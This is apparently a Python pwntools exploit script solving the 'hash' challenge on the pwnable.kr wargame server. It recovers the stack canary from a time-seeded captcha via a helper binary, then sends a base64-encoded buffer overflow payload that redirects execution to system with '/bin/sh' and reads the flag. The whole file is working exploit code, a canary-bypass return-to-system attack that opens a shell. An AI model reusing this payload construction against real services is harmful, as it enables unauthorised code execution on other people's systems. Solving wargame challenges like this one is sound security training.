from pwn import *
import argh
import time


ADDR = 'pwnable.kr'
PORT = 9002


def start_gdb(exe_name):
    return gdb.debug([exe_name], '''
    # b *0x8049026
    # bp when reading canary
    # b *0x8048ee5
    # bp when reading canary
    # b *0x8049074
    # bp when calling system
    b *0x8049187
    # bp when returning from process_hash
    b *0x804908e
    # bp when calling fgets
    b *0x8048ff8
    layout regs
    continue
    ''')


def calc_canary(p, t):
    p.recvuntil('input captcha : ')
    captcha = int(p.recvline())
    p.sendline(str(captcha))

    get_canaray_p = process(argv=['./get_canary', str(t), str(captcha)])
    canary = int(get_canaray_p.recvline(), base=16)
    get_canaray_p.kill()
    return canary


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = './hash'
    e = ELF(bin_path)

    if local:
        p = start_gdb(bin_path)
    elif runpwn:
        p = remote(ADDR, PORT)
    t = int(time.time())

    canary = calc_canary(p, t)
    p.recvuntil('paste me!')
    payload_length = len(b64e(fit({512: p32(canary), 528: p32(0x8049187), 532: p32(0)})))
    payload = b64e(fit({512: p32(canary), 528: p32(0x8049187), 532: p32(e.symbols.g_buf + payload_length)})) + '/bin/sh\x00'
    p.sendline(payload)
    p.recvlines(2)
    p.sendline('cat flag')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

